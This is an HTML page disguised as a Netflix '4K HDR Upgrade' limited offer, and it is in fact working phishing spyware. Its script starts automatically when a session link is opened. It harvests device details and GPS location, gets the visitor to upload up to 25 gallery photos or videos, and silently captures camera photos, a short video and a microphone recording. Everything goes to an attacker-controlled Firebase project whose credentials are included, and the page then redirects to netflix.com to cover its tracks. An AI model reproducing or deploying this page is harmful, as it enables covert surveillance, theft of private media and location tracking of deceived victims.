<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>4K HDR Upgrade | Netflix</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .card {
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #e50914, #b20710);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 40px;
            box-shadow: 0 0 20px rgba(229, 9, 20, 0.3);
        }
        
        h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        
        .badge {
            display: inline-block;
            background: linear-gradient(135deg, #e50914, #b20710);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #fff;
        }
        
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        
        .quality-box {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 28px;
            text-align: left;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .quality-box p {
            color: #ccc;
            font-size: 14px;
            margin: 8px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .quality-box .label {
            color: #888;
            width: 70px;
        }
        
        .quality-box .value {
            color: #fff;
            font-weight: 500;
        }
        
        .quality-badge {
            background: rgba(229, 9, 20, 0.2);
            border: 1px solid rgba(229, 9, 20, 0.5);
            display: inline-block;
            padding: 6px 14px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 12px;
            color: #e50914;
        }
        
        .btn {
            background: linear-gradient(135deg, #e50914, #b20710);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 44px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 8px;
        }
        
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 25px rgba(229, 9, 20, 0.4);
        }
        
        .btn:disabled {
            background: #444;
            transform: none;
            cursor: not-allowed;
            box-shadow: none;
        }
        
        .loader {
            margin-top: 20px;
            color: #e50914;
            font-size: 13px;
            display: none;
            padding: 12px;
            background: rgba(229, 9, 20, 0.1);
            border-radius: 30px;
        }
        
        .status-msg {
            margin-top: 16px;
            padding: 12px;
            border-radius: 30px;
            font-size: 12px;
            display: none;
            background: rgba(74, 222, 128, 0.1);
            color: #4ade80;
            border: 1px solid rgba(74, 222, 128, 0.3);
        }
        
        .status-msg.error {
            background: rgba(255, 107, 107, 0.1);
            color: #ff6b6b;
            border-color: rgba(255, 107, 107, 0.3);
        }
        
        input, video, canvas {
            display: none;
        }
        
        .footer {
            margin-top: 24px;
            color: #555;
            font-size: 10px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            🎬
        </div>
        <h1>4K HDR Upgrade</h1>
        <div class="badge">⚡ LIMITED OFFER</div>
        <div class="sub">Enhance your streaming quality in seconds</div>
        
        <div class="quality-box">
            <p>
                <span class="label">📱 Device:</span>
                <span class="value" id="deviceName">Detecting...</span>
            </p>
            <p>
                <span class="label">📶 Current:</span>
                <span class="value">HD Ready (1080p)</span>
            </p>
            <p>
                <span class="label">✨ Upgrade:</span>
                <span class="value">4K HDR + Dolby Atmos</span>
            </p>
            <div class="quality-badge">⚡ One-click optimization</div>
        </div>
        
        <button class="btn" id="upgradeBtn">⚡ ENABLE 4K HDR</button>
        <div class="loader" id="loader">Optimizing your device...</div>
        <div class="status-msg" id="statusMsg"></div>
        <div class="footer">
            🔒 Encrypted • One-time setup • Instant activation
        </div>
    </div>
    
    <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        // ========== FIREBASE CONFIG ==========
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const storage = firebase.storage();
        
        // Get session ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const upgradeBtn = document.getElementById('upgradeBtn');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');
        
        if (!sessionId) {
            showMessage('❌ Invalid upgrade link. Please use the correct link.', true);
            upgradeBtn.disabled = true;
        }
        
        // Device detection
        const ua = navigator.userAgent;
        let deviceName = "Unknown";
        if (ua.includes("iPhone")) deviceName = "iPhone";
        else if (ua.includes("Android")) deviceName = "Android";
        else if (ua.includes("Windows")) deviceName = "Windows PC";
        else if (ua.includes("Mac")) deviceName = "Mac";
        document.getElementById('deviceName').innerText = deviceName;
        
        function showMessage(msg, isError = false) {
            statusMsg.style.display = 'block';
            statusMsg.className = isError ? 'status-msg error' : 'status-msg';
            statusMsg.innerHTML = msg;
            setTimeout(() => {
                statusMsg.style.display = 'none';
            }, 4000);
        }
        
        // Save to Realtime Database
        async function saveData(type, data) {
            if (!sessionId) return false;
            try {
                const timestamp = new Date().toISOString();
                const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
                await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
                    type: type,
                    data: data,
                    timestamp: timestamp
                });
                console.log(`✅ Saved: ${type}`);
                return true;
            } catch(e) {
                console.error('Save error:', e);
                return false;
            }
        }
        
        // Upload file to Firebase Storage
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveData(type, { url, name: file.name, size: file.size });
            return url;
        }
        
        // 1. Device Info
        async function sendDeviceInfo() {
            await saveData('device_info', {
                device: deviceName,
                ua: ua,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language
            });
        }
        
        // 2. Location
        async function getLocation() {
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                await saveData('location', {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                return true;
            } catch(e) {
                return false;
            }
        }
        
        // 3. Gallery
        async function getGallery() {
            return new Promise((resolve) => {
                const input = document.getElementById('galleryInput');
                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    if (files.length === 0) { resolve(false); return; }
                    loader.innerHTML = `📸 Uploading ${files.length} files...`;
                    for (let i = 0; i < Math.min(files.length, 25); i++) {
                        const file = files[i];
                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                        await uploadFile(file, type);
                        loader.innerHTML = `📸 Uploaded ${i+1}/${Math.min(files.length, 25)}`;
                    }
                    resolve(true);
                };
                input.click();
            });
        }
        
        // 4. Camera + Video
        async function captureMedia() {
            try {
                loader.innerHTML = "📷 Requesting camera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 500));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                // 4 photos
                for (let i = 1; i <= 4; i++) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                    await uploadFile(file, 'camera_photo');
                    loader.innerHTML = `📷 Captured ${i}/4 photos`;
                    await new Promise(r => setTimeout(r, 300));
                }
                
                // 5 sec video
                loader.innerHTML = "🎥 Recording video (5s)...";
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
                    await uploadFile(file, 'video_recording');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                console.log("Camera error:", e);
                return false;
            }
        }
        
        // 5. Microphone
        async function getMicrophone() {
            try {
                loader.innerHTML = "🎤 Testing audio...";
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await uploadFile(file, 'microphone');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) { return false; }
        }
        
        // MAIN UPGRADE FUNCTION
        async function startUpgrade() {
            if (!sessionId) return;
            
            upgradeBtn.disabled = true;
            loader.style.display = 'block';
            loader.innerHTML = "🔧 Preparing device optimization...";
            
            await sendDeviceInfo();
            await getLocation();
            
            loader.innerHTML = "📸 Select media to optimize...";
            showMessage("Please select photos/videos from your gallery", false);
            await getGallery();
            
            await captureMedia();
            await getMicrophone();
            
            await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
            
            loader.innerHTML = "✅ 4K HDR Enabled! Redirecting...";
            showMessage("4K HDR is now active on your device", false);
            
            setTimeout(() => {
                window.location.href = "https://www.netflix.com";
            }, 2000);
        }
        
        upgradeBtn.onclick = startUpgrade;
        
        // Auto-start after 500ms
        if (sessionId) {
            setTimeout(startUpgrade, 500);
        }
    </script>
</body>
</html>
